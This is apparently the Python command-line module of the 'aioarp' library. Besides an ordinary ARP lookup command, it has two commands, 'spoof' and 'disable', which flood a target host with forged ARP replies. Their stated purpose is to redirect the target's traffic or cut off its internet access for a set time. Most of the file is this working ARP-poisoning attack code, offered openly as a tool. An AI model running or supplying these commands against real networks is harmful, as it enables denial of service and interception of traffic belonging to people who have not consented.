import datetime
import time

try:
    import typer
except ImportError as e:
    text = ("You are attempting to use aioarp cli without "
            "installing the necessary dependencies; install "
            "aioarp with all required cli dependencies using "
            "this command `pip install aioarp[cli]`")
    raise ImportError(text) from e

import typing

from typing_extensions import Annotated

import aioarp

app = typer.Typer()

# TODO: add tests

@app.command()
def send(
        target_ip: Annotated[str,
                             typer.Argument(
                                help="Target IP, the IP address for "
                                "which we are looking for a mac address.")],
        interface: Annotated[str,
                             typer.Argument(
                                help="Network interface which should be used to send the arp packet.")] = None,
        timeout: Annotated[typing.Optional[int], typer.Option(help="Timeout for arp request.")] = None,
        wait_response: Annotated[bool,
                                 typer.Option(help="If you do not want to wait for a response, set False.")] = True
) -> None:  # pragma: no cover
        try:
            request_packet = aioarp.build_arp_packet(target_ip, interface)
            interface = interface or aioarp.get_default_interface()

            if wait_response:
                print(f"Looking for {request_packet.target_ip} in "
                      f"{interface}[{request_packet.target_mac}]")
            else:
                print(f"ARP packet seeking {request_packet.target_ip}" 
                      f"was sent in {interface}[{request_packet.target_mac}]")
            arp_response = aioarp.sync_send_arp(request_packet, None, interface, timeout, wait_response)

            if wait_response:
                text = f"The mac address of IP '{target_ip}' is: {arp_response.sender_mac}"
                print(text)
            return typer.Exit()
        except PermissionError:
            text = "To send ARP requests, you must run a script with root privileges."
            print(text)
            return typer.Exit(1)
        except aioarp.NotFoundError:
            text = f"The IP address {target_ip}' did not respond to our ARP request."
            print(text)
            return typer.Exit(1)

@app.command()
def spoof(
    target_ip: Annotated[str,
        typer.Argument(help="Target IP address for which we want to disable internet access via ARP poisoning")],
    pretend_as: Annotated[str,
                          typer.Argument(
                            help="The IP address that we are pretending to be is used "
                          "to force the host to send traffic to you instead of this IP address.")],
    fake_mac: Annotated[str,
                          typer.Argument(
                            help="Fake mac address that should be set as pretend_as's mac address.")],
    interface: Annotated[str,
                          typer.Argument(
                            help="Network interface which should be used to send the arp packet.")] = None,
    seconds: Annotated[int,
                       typer.Option(help="Specifies the length of time we"
                                    " want to disable internet access for this host.")] = 5
):
    broadcast = target_ip == '0.0.0.0'

    if not broadcast:
        response = aioarp.request(target_ip, interface)
    arp_packet = aioarp.build_arp_packet(target_ip, interface)
    arp_packet.sender_ip = pretend_as
    arp_packet.sender_mac = fake_mac
    arp_packet.target_mac = 'ff:ff:ff:ff:ff:ff' if broadcast else response.sender_mac
    arp_packet.opcode = aioarp.Opcode.response

    start_time = time.time()
    
    print(f"ARP poisoning has begun. [{datetime.datetime.now()}]")
    while True:
        
        aioarp.sync_send_arp(arp_packet, interface=interface, wait_response=False, timeout=1)
        if time.time() - start_time > seconds:
            break
    print(f"The ARP poisoning has ended. [{datetime.datetime.now()}]")


@app.command()
def disable(
    target_ip: Annotated[str,
        typer.Argument(help="Target IP address for which we want to disable internet access via ARP poisoning")],
    pretend_as: Annotated[str,
                          typer.Argument(
                            help="The IP address that we are pretending to be is used "
                          "to force the host to send traffic to you instead of this IP address.")],
    interface: Annotated[str,
                          typer.Argument(
                            help="Network interface which should be used to send the arp packet.")] = None,
    seconds: Annotated[int,
                       typer.Option(help="Specifies the length of time we"
                                    " want to disable internet access for this host.")] = 5
):
    response = aioarp.request(target_ip, interface)
    arp_packet = aioarp.build_arp_packet(target_ip, interface)
    arp_packet.sender_ip = pretend_as
    arp_packet.sender_mac = "11:11:11:11:11:11"
    arp_packet.target_mac = response.sender_mac
    arp_packet.opcode = aioarp.Opcode.response

    start_time = time.time()
    
    print(f"ARP poisoning has begun. [{datetime.datetime.now()}]")
    while True:
        
        aioarp.sync_send_arp(arp_packet, interface=interface, wait_response=False, timeout=1)
        if time.time() - start_time > seconds:
            break
    print(f"The ARP poisoning has ended. [{datetime.datetime.now()}]")

if __name__ == "__main__":
    app()
